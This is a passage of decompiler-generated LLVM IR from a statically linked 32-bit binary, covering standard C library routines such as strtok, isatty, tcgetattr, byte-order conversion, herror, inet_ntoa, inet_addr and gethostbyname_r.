  %v7_805360f = load i16, i16* %v6_805360f, align 2
  %v18_805360f = icmp eq i16 %v5_805360b, %v7_805360f
  %v1_8053613 = icmp eq i1 %v18_805360f, false
  br i1 %v1_8053613, label %dec_label_pc_8053619, label %dec_label_pc_8053615

dec_label_pc_8053615:                             ; preds = %dec_label_pc_80535ff, %dec_label_pc_80535f5
  %v4_80535f546 = phi i32 [ %v0_80535ff, %dec_label_pc_80535ff ], [ %v6_80535f5, %dec_label_pc_80535f5 ]
  %v4_80535eb6 = phi i32 [ %v6_805360b, %dec_label_pc_80535ff ], [ %v6_80535eb30, %dec_label_pc_80535f5 ]
  %v1_8053615 = add i32 %v0_805361527, 1
  %v1_8053616 = add i32 %v0_805361626, 1
  %v1_80535eb = inttoptr i32 %v1_8053615 to i8*
  %v2_80535eb = load i8, i8* %v1_80535eb, align 1
  %v3_80535eb = zext i8 %v2_80535eb to i32
  %v5_80535eb = and i32 %v4_80535eb6, -256
  %v6_80535eb = or i32 %v3_80535eb, %v5_80535eb
  %v4_80535ed = icmp eq i8 %v2_80535eb, 0
  %v1_80535ef = icmp eq i1 %v4_80535ed, false
  br i1 %v1_80535ef, label %dec_label_pc_80535f5, label %dec_label_pc_8053625

dec_label_pc_8053619:                             ; preds = %dec_label_pc_80535ff
  %v4_8053619 = icmp eq i8 %v2_80535f5, 0
  br i1 %v4_8053619, label %dec_label_pc_8053623, label %dec_label_pc_8053620

dec_label_pc_8053620:                             ; preds = %dec_label_pc_8053619
  %v1_8053620 = add i32 %v0_805362039, 1
  %v2_80535eb19 = load i8, i8* %v1_80535eb18, align 1
  %v3_80535eb20 = zext i8 %v2_80535eb19 to i32
  %v5_80535eb21 = and i32 %v6_805360b, 65280
  %v6_80535eb22 = or i32 %v3_80535eb20, %v5_80535eb21
  %v4_80535ed23 = icmp eq i8 %v2_80535eb19, 0
  %v1_80535ef25 = icmp eq i1 %v4_80535ed23, false
  br i1 %v1_80535ef25, label %dec_label_pc_80535f5.lr.ph, label %dec_label_pc_8053625

dec_label_pc_8053623:                             ; preds = %dec_label_pc_8053619
  br label %dec_label_pc_8053625

dec_label_pc_8053625:                             ; preds = %dec_label_pc_8053620, %entry, %dec_label_pc_8053615, %dec_label_pc_8053623
  %storemerge = phi i32 [ 0, %dec_label_pc_8053623 ], [ %v4_80535df, %entry ], [ %v1_8053620, %dec_label_pc_8053620 ], [ %v0_805362039, %dec_label_pc_8053615 ]
  store i32 %v0_80535db, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_80535eb19, { 1, 2, 0 }
  uselistorder i8 %v2_80535eb, { 1, 2, 0 }
  uselistorder i8* %v1_80535eb, { 1, 0 }
  uselistorder i32 %v0_80535ff, { 1, 2, 3, 0 }
  uselistorder i8 %v2_80535f5, { 1, 0, 2 }
  uselistorder i32 %v0_805361626, { 1, 0 }
  uselistorder i8 %v2_80535eb1932, { 0, 2, 1 }
  uselistorder i8* %v1_80535eb18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053625, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80535f5, { 1, 0 }
  uselistorder label %dec_label_pc_80535f5.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805363c = inttoptr i32 %arg1 to i8*
  %v4_805363c = call i32 @strtok_r(i8* %v3_805363c, i32 %arg2, i32 ptrtoint (i32* @global_var_8065520.939 to i32))
  ret i32 %v4_805363c
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_8053654 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8053659 = icmp eq i32 %v3_8053654, 0
  %v1_805365b = zext i1 %v1_8053659 to i32
  ret i32 %v1_805365b
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053668 = load i32, i32* @esi, align 4
  %v0_8053669 = load i32, i32* @ebx, align 4
  store i32 %v0_8053669, i32* %stack_var_-8, align 4
  %v2_805366d = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805366d, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_805367f = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_805366d)
  store i32 %v3_805367f, i32* %eax.global-to-local, align 4
  %v1_8053687 = icmp eq i32 %v3_805367f, 0
  store i32 %v3_805367f, i32* @esi, align 4
  %v1_805368b = icmp eq i1 %v1_8053687, false
  br i1 %v1_805368b, label %dec_label_pc_80536d0, label %dec_label_pc_805368d

dec_label_pc_805368d:                             ; preds = %entry
  %v3_805368d = load i32, i32* %stack_var_-44, align 4
  %v1_8053691 = load i32, i32* @ebx, align 4
  %v2_8053691 = inttoptr i32 %v1_8053691 to i32*
  store i32 %v3_805368d, i32* %v2_8053691, align 4
  %v1_8053697 = load i32, i32* @ebx, align 4
  %v2_8053697 = add i32 %v1_8053697, 4
  %v3_8053697 = inttoptr i32 %v2_8053697 to i32*
  %v1_805369e = load i32, i32* @ebx, align 4
  %v2_805369e = add i32 %v1_805369e, 8
  %v3_805369e = inttoptr i32 %v2_805369e to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_80536a5 = load i32, i32* @ebx, align 4
  %v2_80536a5 = add i32 %v1_80536a5, 12
  %v3_80536a5 = inttoptr i32 %v2_80536a5 to i32*
  store i32 %tmp3, i32* %v3_80536a5, align 4
  %v4_80536a8 = zext i8 %tmp to i32
  %v5_80536a8 = load i32, i32* %eax.global-to-local, align 4
  %v6_80536a8 = and i32 %v5_80536a8, -256
  %v7_80536a8 = or i32 %v6_80536a8, %v4_80536a8
  store i32 %v7_80536a8, i32* %eax.global-to-local, align 4
  %v2_80536ac = load i32, i32* @ebx, align 4
  %v3_80536ac = add i32 %v2_80536ac, 16
  %v4_80536ac = inttoptr i32 %v3_80536ac to i8*
  store i8 %tmp, i8* %v4_80536ac, align 1
  %v0_80536af = load i32, i32* %eax.global-to-local, align 4
  %v2_80536b2 = ptrtoint i32* %stack_var_-27 to i32
  %v0_80536b7 = load i32, i32* @ebx, align 4
  %v1_80536b7 = add i32 %v0_80536b7, 17
  store i32 %v1_80536b7, i32* %eax.global-to-local, align 4
  %v4_80536bb = call i32 @__GI_mempcpy(i32 %v1_80536b7, i32 %v2_80536b2, i32 19, i32 %v0_80536af)
  store i32 %v4_80536bb, i32* %eax.global-to-local, align 4
  %v3_80536c8 = inttoptr i32 %v4_80536bb to i8*
  %v4_80536c8 = call i32 @__GI_memset(i8* %v3_80536c8, i32 0, i32 13)
  store i32 %v4_80536c8, i32* %eax.global-to-local, align 4
  %v0_80536d3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80536d0

dec_label_pc_80536d0:                             ; preds = %entry, %dec_label_pc_805368d
  %v0_80536d3 = phi i32 [ %v3_805367f, %entry ], [ %v0_80536d3.pre, %dec_label_pc_805368d ]
  store i32 %v0_80536d3, i32* %eax.global-to-local, align 4
  %v2_80536d5 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80536d5, i32* @ebx, align 4
  store i32 %v0_8053668, i32* @esi, align 4
  ret i32 %v0_80536d3

; uselistorder directives
  uselistorder i32 %v0_80536d3, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80536d0, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_80536dd = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_80536dd = zext i16 %v3_80536dd to i32
  ret i32 %v4_80536dd
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_80536e9 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_80536e9
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_80536f1 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_80536f1 = zext i16 %v3_80536f1 to i32
  ret i32 %v4_80536f1
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80536fd = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_80536fd
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %v6_805370c = icmp ugt i32 %arg1, 4
  br i1 %v6_805370c, label %dec_label_pc_8053715, label %dec_label_pc_805370e

dec_label_pc_805370e:                             ; preds = %entry
  %v1_805370e = mul i32 %arg1, 4
  %v2_805370e = add i32 %v1_805370e, ptrtoint ([5 x i8*]* @global_var_805e7a8.946 to i32)
  %v3_805370e = inttoptr i32 %v2_805370e to i32*
  %v4_805370e = load i32, i32* %v3_805370e, align 4
  br label %dec_label_pc_8053715

dec_label_pc_8053715:                             ; preds = %entry, %dec_label_pc_805370e
  %v0_8053715 = phi i32 [ ptrtoint ([15 x i8]* @global_var_805e7bc.940 to i32), %entry ], [ %v4_805370e, %dec_label_pc_805370e ]
  ret i32 %v0_8053715

; uselistorder directives
  uselistorder label %dec_label_pc_8053715, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %v4_805371b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805371b, i32* @ebx, align 4
  %v2_805371f = icmp eq i8* %arg1, null
  br i1 %v2_805371f, label %dec_label_pc_805372d, label %dec_label_pc_8053723

dec_label_pc_8053723:                             ; preds = %entry
  %v3_8053723 = load i8, i8* %arg1, align 1
  %v4_8053723 = icmp eq i8 %v3_8053723, 0
  %v1_805372b = icmp eq i1 %v4_8053723, false
  br i1 %v1_805372b, label %dec_label_pc_8053732, label %dec_label_pc_805372d

dec_label_pc_805372d:                             ; preds = %dec_label_pc_8053723, %entry
  br label %dec_label_pc_8053732

dec_label_pc_8053732:                             ; preds = %dec_label_pc_8053723, %dec_label_pc_805372d
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_805e7cd.948 to i32), %dec_label_pc_805372d ], [ ptrtoint ([3 x i8]* @global_var_805e7cb.947 to i32), %dec_label_pc_8053723 ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_8053732 = call i32 @__GI___h_errno_location()
  store i32 ptrtoint ([15 x i8]* @global_var_805e7bc.940 to i32), i32* @edx, align 4
  %v1_805373c = inttoptr i32 %v0_8053732 to i32*
  %v2_805373c = load i32, i32* %v1_805373c, align 4
  %v6_8053741 = icmp ugt i32 %v2_805373c, 4
  br i1 %v6_8053741, label %dec_label_pc_805374a, label %dec_label_pc_8053743

dec_label_pc_8053743:                             ; preds = %dec_label_pc_8053732
  %v1_8053743 = mul i32 %v2_805373c, 4
  %v2_8053743 = add i32 %v1_8053743, ptrtoint ([5 x i8*]* @global_var_805e7a8.946 to i32)
  %v3_8053743 = inttoptr i32 %v2_8053743 to i32*
  %v4_8053743 = load i32, i32* %v3_8053743, align 4
  store i32 %v4_8053743, i32* @edx, align 4
  br label %dec_label_pc_805374a

dec_label_pc_805374a:                             ; preds = %dec_label_pc_8053732, %dec_label_pc_8053743
  %v0_805374d = phi i32 [ ptrtoint ([15 x i8]* @global_var_805e7bc.940 to i32), %dec_label_pc_8053732 ], [ %v4_8053743, %dec_label_pc_8053743 ]
  %v0_805374e = load i32, i32* @esi, align 4
  %v0_8053755 = load i32, i32* inttoptr (i32 134607440 to i32*), align 16
  %v9_805375b = call i32 @fprintf(i32 %v0_8053755, i32 ptrtoint ([8 x i8]* @global_var_805e73a.949 to i32), i32 %v4_805371b, i32 %v0_805374e, i32 %v0_805374d)
  ret i32 %v9_805375b

; uselistorder directives
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_805e7bc.940 to i32), { 0, 2, 1 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805374a, { 1, 0 }
  uselistorder label %dec_label_pc_8053732, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053768 = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_805376b = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_805376e = load i32, i32* @ebx, align 4
  store i32 %v0_805376e, i32* %stack_var_-12, align 4
  %v1_8053777 = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_8053777, 16777216
  %v1_8053779 = sdiv i32 %sext, 16777216
  store i32 %v1_8053779, i32* @ebx, align 4
  %v1_805377b = add i32 %arg2, 15
  store i32 %v1_805377b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053780

dec_label_pc_8053780:                             ; preds = %entry, %dec_label_pc_80537a5
  %v0_805378717 = phi i32 [ %v1_8053779, %entry ], [ %v2_80537a5, %dec_label_pc_80537a5 ]
  %v0_80537b116 = phi i32 [ %v1_805377b, %entry ], [ %v0_80537a9, %dec_label_pc_80537a5 ]
  %v1_805378b = urem i32 %v0_805378717, 256
  %v5_8053793 = inttoptr i32 %v0_80537b116 to i8*
  %v6_8053793 = call i32 @_uintmaxtostr(i8* %v5_8053793, i32 %v1_805378b, i32 0, i32 -10, i32 0)
  %v0_805379b = load i32, i32* @esi, align 4
  %v1_805379b = icmp eq i32 %v0_805379b, 0
  %v1_805379d = add i32 %v6_8053793, -1
  store i32 %v1_805379d, i32* %ecx.global-to-local, align 4
  br i1 %v1_805379b, label %dec_label_pc_80537a5, label %dec_label_pc_80537a2

dec_label_pc_80537a2:                             ; preds = %dec_label_pc_8053780
  %v1_80537a2 = inttoptr i32 %v0_805379b to i8*
  store i8 46, i8* %v1_80537a2, align 1
  %v0_80537a9.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80537a5

dec_label_pc_80537a5:                             ; preds = %dec_label_pc_8053780, %dec_label_pc_80537a2
  %v0_80537a9 = phi i32 [ %v1_805379d, %dec_label_pc_8053780 ], [ %v0_80537a9.pre, %dec_label_pc_80537a2 ]
  %v0_80537a5 = load i32, i32* @ebx, align 4
  %v2_80537a5 = udiv i32 %v0_80537a5, 256
  store i32 %v2_80537a5, i32* @ebx, align 4
  %v0_80537a8 = load i32, i32* @edi, align 4
  %v1_80537a8 = add i32 %v0_80537a8, 1
  store i32 %v1_80537a8, i32* @edi, align 4
  store i32 %v0_80537a9, i32* @esi, align 4
  %v7_80537ae = icmp sgt i32 %v1_80537a8, 3
  br i1 %v7_80537ae, label %dec_label_pc_80537b0, label %dec_label_pc_8053780

dec_label_pc_80537b0:                             ; preds = %dec_label_pc_80537a5
  %v2_80537b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80537b0, i32* @ebx, align 4
  %v1_80537b1 = add i32 %v0_80537a9, 1
  store i32 %v0_805376b, i32* @esi, align 4
  store i32 %v0_8053768, i32* @edi, align 4
  ret i32 %v1_80537b1

; uselistorder directives
  uselistorder i32 %v0_80537a9, { 0, 2, 1 }
  uselistorder i32 %v1_8053779, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80537a5, { 1, 0 }
  uselistorder label %dec_label_pc_8053780, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_80537c3 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_8065524.950 to i32))
  ret i32 %v2_80537c3
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_80537cf = ptrtoint i32* %stack_var_-4 to i32
  %v2_80537d8 = inttoptr i32 %arg1 to i8*
  %v3_80537d8 = call i32 @inet_aton(i8* %v2_80537d8, i32 %v2_80537cf)
  %v1_80537e3 = icmp eq i32 %v3_80537d8, 0
  br i1 %v1_80537e3, label %dec_label_pc_80537eb, label %dec_label_pc_80537e7

dec_label_pc_80537e7:                             ; preds = %entry
  %v3_80537e7 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80537eb

dec_label_pc_80537eb:                             ; preds = %entry, %dec_label_pc_80537e7
  %v0_80537eb = phi i32 [ -1, %entry ], [ %v3_80537e7, %dec_label_pc_80537e7 ]
  ret i32 %v0_80537eb

; uselistorder directives
  uselistorder label %dec_label_pc_80537eb, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80537f7 = call i32 @__GI___h_errno_location()
  %v0_80537fc = load i32, i32* @edx, align 4
  %v2_80537ff = ptrtoint i32* %stack_var_-4 to i32
  %v9_8053817 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_806570c.952, i32 ptrtoint (i32* @global_var_8065540.951 to i32), i32 460, i32 %v2_80537ff, i32 %v0_80537f7, i32 %v0_80537fc, i32 %v0_80537fc)
  %v3_805381c = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_805381c
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_1()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8053824 = load i32, i32* @ebp, align 4
  %v0_8053825 = load i32, i32* @edi, align 4
  %v0_8053826 = load i32, i32* @esi, align 4
  %v0_8053827 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8053837 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8053837, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8053842 = icmp eq i32 %arg1, 0
  br i1 %v4_8053842, label %dec_label_pc_8053b4e, label %dec_label_pc_805384d

dec_label_pc_805384d:                             ; preds = %entry
  %v1_805384d = call i32 @__errno_location(i32 %v0_8053827)
  store i32 %v1_805384d, i32* %eax.global-to-local, align 4
  %v1_8053852 = inttoptr i32 %v1_805384d to i32*
  %v2_8053852 = load i32, i32* %v1_8053852, align 4
  store i32 %v2_8053852, i32* @edi, align 4
  store i32 %v1_805384d, i32* @esi, align 4
  store i32 0, i32* %v1_8053852, align 4
  %v0_8053865 = load i32, i32* @ebx, align 4
  store i32 %v0_8053865, i32* %stack_var_-108, align 4
  %v7_8053871 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_8053865, i32 %arg5, i32 %arg6, i32 %v1_805384d)
  store i32 %v7_8053871, i32* %eax.global-to-local, align 4
  %v1_8053879 = icmp eq i32 %v7_8053871, 0
  br i1 %v1_8053879, label %dec_label_pc_8053b4e, label %dec_label_pc_8053881

dec_label_pc_8053881:                             ; preds = %dec_label_pc_805384d
  store i32 %arg6, i32* @ecx, align 4
  %v1_8053885 = inttoptr i32 %arg6 to i32*
  %v2_8053885 = load i32, i32* %v1_8053885, align 4
  store i32 %v2_8053885, i32* %edx.global-to-local, align 4
  %v9_8053887 = icmp eq i32 %v2_8053885, 1
  br i1 %v9_8053887, label %dec_label_pc_80538a1, label %dec_label_pc_805388c

dec_label_pc_805388c:                             ; preds = %dec_label_pc_8053881
  %v9_805388c = icmp eq i32 %v2_8053885, 4
  br i1 %v9_805388c, label %dec_label_pc_80538a1, label %dec_label_pc_8053891

dec_label_pc_8053891:                             ; preds = %dec_label_pc_805388c
  %v1_8053891 = add i32 %v2_8053885, 1
  %v8_8053891 = icmp eq i32 %v1_8053891, 0
  store i32 %v1_8053891, i32* %edx.global-to-local, align 4
  %v1_8053892 = icmp eq i1 %v8_8053891, false
  br i1 %v1_8053892, label %dec_label_pc_8053b4e, label %dec_label_pc_8053898

dec_label_pc_8053898:                             ; preds = %dec_label_pc_8053891
  %v0_8053898 = load i32, i32* @esi, align 4
  %v1_8053898 = inttoptr i32 %v0_8053898 to i32*
  %v2_8053898 = load i32, i32* %v1_8053898, align 4
  %v11_8053898 = icmp eq i32 %v2_8053898, 2
  %v1_805389b = icmp eq i1 %v11_8053898, false
  br i1 %v1_805389b, label %dec_label_pc_8053b4e, label %dec_label_pc_80538a1

dec_label_pc_80538a1:                             ; preds = %dec_label_pc_8053898, %dec_label_pc_805388c, %dec_label_pc_8053881
  %v0_80538a1 = load i32, i32* @ebp, align 4
  %v1_80538a3 = sub i32 0, %v0_80538a1
  %v1_80538a5 = urem i32 %v1_80538a3, 4
  %v2_80538a5 = icmp eq i32 %v1_80538a5, 0
  store i32 %v1_80538a5, i32* %eax.global-to-local, align 4
  %v0_80538a8 = load i32, i32* @edi, align 4
  %v1_80538a8 = load i32, i32* @esi, align 4
  %v2_80538a8 = inttoptr i32 %v1_80538a8 to i32*
  store i32 %v0_80538a8, i32* %v2_80538a8, align 4
  %v0_80538bc.pre = load i32, i32* @ebx, align 4
  br i1 %v2_80538a5, label %dec_label_pc_80538b8, label %dec_label_pc_80538ac

dec_label_pc_80538ac:                             ; preds = %dec_label_pc_80538a1
  %v1_80538ac = load i32, i32* %eax.global-to-local, align 4
  %v2_80538ac = sub i32 %v0_80538bc.pre, %v1_80538ac
  %v7_80538ac = icmp ult i32 %v0_80538bc.pre, %v1_80538ac
  br i1 %v7_80538ac, label %dec_label_pc_8053b49, label %dec_label_pc_80538b4

dec_label_pc_80538b4:                             ; preds = %dec_label_pc_80538ac
  %v0_80538b4 = load i32, i32* @ebp, align 4
  %v2_80538b4 = add i32 %v0_80538b4, %v1_80538ac
  store i32 %v2_80538b4, i32* @ebp, align 4
  store i32 %v2_80538ac, i32* @ebx, align 4
  br label %dec_label_pc_80538b8

dec_label_pc_80538b8:                             ; preds = %dec_label_pc_80538a1, %dec_label_pc_80538b4
  %v0_80538bc = phi i32 [ %v2_80538ac, %dec_label_pc_80538b4 ], [ %v0_80538bc.pre, %dec_label_pc_80538a1 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_8053885, align 4
  %tmp41 = icmp ult i32 %v0_80538bc, 4
  br i1 %tmp41, label %dec_label_pc_8053b49, label %dec_label_pc_80538cb

dec_label_pc_80538cb:                             ; preds = %dec_label_pc_80538b8
  %v0_80538cb = load i32, i32* @ebx, align 4
  %v1_80538cb = add i32 %v0_80538cb, -4
  store i32 %v1_80538cb, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_80538cb, 8
  br i1 %tmp42, label %dec_label_pc_8053b49, label %dec_label_pc_80538d7

dec_label_pc_80538d7:                             ; preds = %dec_label_pc_80538cb
  %v1_80538d7 = add i32 %v0_80538cb, -12
  store i32 %v1_80538d7, i32* %eax.global-to-local, align 4
  %v0_80538da = load i32, i32* @ebp, align 4
  %v1_80538da = add i32 %v0_80538da, 4
  store i32 %v1_80538da, i32* %edx.global-to-local, align 4
  store i32 %v1_80538da, i32* %stack_var_-92, align 4
  %v3_80538e3 = inttoptr i32 %v1_80538da to i32*
  store i32 %v0_80538da, i32* %v3_80538e3, align 4
  %v0_80538e6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80538e6 = add i32 %v0_80538e6, 4
  %v2_80538e6 = inttoptr i32 %v1_80538e6 to i32*
  store i32 0, i32* %v2_80538e6, align 4
  %tmp43 = icmp ult i32 %v1_80538d7, 32
  br i1 %tmp43, label %dec_label_pc_8053b49, label %dec_label_pc_80538f3

dec_label_pc_80538f3:                             ; preds = %dec_label_pc_80538d7
  %v0_80538f3 = load i32, i32* @ebx, align 4
  %v1_80538f3 = add i32 %v0_80538f3, -44
  store i32 %v1_80538f3, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_80538f3, 256
  br i1 %tmp44, label %dec_label_pc_8053b49, label %dec_label_pc_8053906

dec_label_pc_8053906:                             ; preds = %dec_label_pc_80538f3
  %v0_8053906 = load i32, i32* @ebp, align 4
  %v1_8053906 = add i32 %v0_8053906, 12
  %v1_805390d = add i32 %v0_8053906, 44
  store i32 %v1_805390d, i32* @edi, align 4
  store i32 %v1_805390d, i32* %stack_var_-108, align 4
  %v3_805391a = inttoptr i32 %v1_805390d to i8*
  %v4_805391a = call i32 @strncpy(i8* %v3_805391a, i32 %arg1, i32 %v1_80538f3)
  %v0_805391f = load i32, i32* @edi, align 4
  %v1_805391f = load i32, i32* @ebp, align 4
  %v2_805391f = add i32 %v1_805391f, 12
  %v3_805391f = inttoptr i32 %v2_805391f to i32*
  store i32 %v0_805391f, i32* %v3_805391f, align 4
  %v1_8053926 = add i32 %v0_8053906, 16
  %v2_8053926 = inttoptr i32 %v1_8053926 to i32*
  store i32 0, i32* %v2_8053926, align 4
  %v2_805392d = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805392d, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_805392f = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8053934 = inttoptr i32 %arg1 to i8*
  %v3_8053934 = call i32 @inet_aton(i8* %v2_8053934, i32 %v0_805392f)
  store i32 %v3_8053934, i32* %eax.global-to-local, align 4
  %v1_805393c = icmp eq i32 %v3_8053934, 0
  br i1 %v1_805393c, label %dec_label_pc_8053978, label %dec_label_pc_8053940

dec_label_pc_8053940:                             ; preds = %dec_label_pc_8053906
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8053944 = load i32, i32* @edi, align 4
  store i32 %v0_8053944, i32* %arg2, align 4
  %v1_8053946 = add i32 %tmp18, 8
  %v2_8053946 = inttoptr i32 %v1_8053946 to i32*
  store i32 2, i32* %v2_8053946, align 4
  %v0_805394d = load i32, i32* %edx.global-to-local, align 4
  %v1_805394d = add i32 %v0_805394d, 12
  %v2_805394d = inttoptr i32 %v1_805394d to i32*
  store i32 4, i32* %v2_805394d, align 4
  %v2_8053954 = load i32, i32* %stack_var_-92, align 4
  %v1_8053957 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053957 = add i32 %v1_8053957, 16
  %v3_8053957 = inttoptr i32 %v2_8053957 to i32*
  store i32 %v2_8053954, i32* %v3_8053957, align 4
  %v1_805395e = load i32, i32* %edx.global-to-local, align 4
  %v2_805395e = add i32 %v1_805395e, 4
  %v3_805395e = inttoptr i32 %v2_805395e to i32*
  store i32 %v1_8053906, i32* %v3_805395e, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_8053965 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8053965, i32* %v1_8053837, align 4
  store i32 0, i32* %v1_8053885, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b4e

dec_label_pc_8053978:                             ; preds = %dec_label_pc_8053906
  %v0_8053978 = call i32 @__open_nameservers()
  store i32 %v0_8053978, i32* @eax, align 4
  %v2_8053988 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8053988, i32* @ebx, align 4
  store i32 %v2_8053988, i32* %stack_var_-108, align 4
  %v2_805398d = call i32 @__pthread_return_void(i32 %v2_8053988, i32 134567199)
  store i32 %v2_805398d, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805f4a8.953 to i32), i32* %stack_var_-108, align 4
  %v1_8053999 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f4a8.953 to i32))
  %v0_805399e = load i32, i32* @global_var_8065b94.954, align 4
  store i32 %v0_805399e, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805f4a8.953 to i32), i32* @ecx, align 4
  store i32 134567199, i32* @eax, align 4
  store i32 %v2_8053988, i32* %stack_var_-108, align 4
  %v2_80539a9 = call i32 @__pthread_return_void(i32 %v2_8053988, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_80539c4 = ptrtoint i32* %stack_var_-76 to i32
  %v2_80539c9 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80539c9, i32* %eax.global-to-local, align 4
  store i32 %v2_80539c9, i32* %stack_var_-108, align 4
  %v0_80539d3 = load i32, i32* @esi, align 4
  %v7_80539da = call i32 @__dns_lookup(i8* %v2_8053934, i32 1, i32 %v0_80539d3, i32 ptrtoint (i32* @global_var_8065b88.955 to i32), i32 %v2_80539c9, i32 %v2_80539c4)
  store i32 %v7_80539da, i32* %eax.global-to-local, align 4
  %v2_80539e2 = icmp slt i32 %v7_80539da, 0
  %v1_80539e4 = icmp eq i1 %v2_80539e2, false
  br i1 %v1_80539e4, label %dec_label_pc_80539fa, label %dec_label_pc_80539e6

dec_label_pc_80539e6:                             ; preds = %dec_label_pc_8053978
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8053885, align 4
  br label %dec_label_pc_8053b4e

